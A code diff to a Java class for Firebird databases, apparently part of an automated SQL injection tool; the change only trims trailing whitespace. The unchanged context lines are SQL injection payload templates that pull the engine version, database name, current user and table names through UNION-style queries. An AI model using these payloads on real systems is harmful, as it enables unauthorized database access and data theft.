@@ -12,18 +12,18 @@ public class FirebirdStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return 
+        return
             "SELECT+rdb$get_context('SYSTEM','ENGINE_VERSION')||'{%}'||rdb$get_context('SYSTEM','DB_NAME')"
             + "||'{%}'||rdb$get_context('SYSTEM','CURRENT_USER')||'{%}?%01%03%03%07'from+rdb$database";
     }
 
     @Override
     public String getSchemaList() {
-        return 
+        return
             /**
              * aggreg function return exec fault
              * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
-             * => use limit 1,1 instead 
+             * => use limit 1,1 instead
              */
             "select+'%04'||rdb$get_context('SYSTEM','DB_NAME')||'%050%04%01%03%03%07'from+rdb$database{limit}";
     }
@@ -52,7 +52,7 @@ public class FirebirdStrategy extends ASQLStrategy {
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return 
+        return
             "select+" +
                 /**
                  * If reach end of string (SQLii) then NULLIF nullifies the result
@@ -66,7 +66,7 @@ public class FirebirdStrategy extends ASQLStrategy {
 
      @Override
      public String performanceQuery(String[] indexes) {
-         return 
+         return
              MediatorModel.model().initialQuery.replaceAll(
                  "1337(" + ToolsString.join(indexes, "|") + ")7331",
                  "(select+'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'from+RDB\\$DATABASE)"
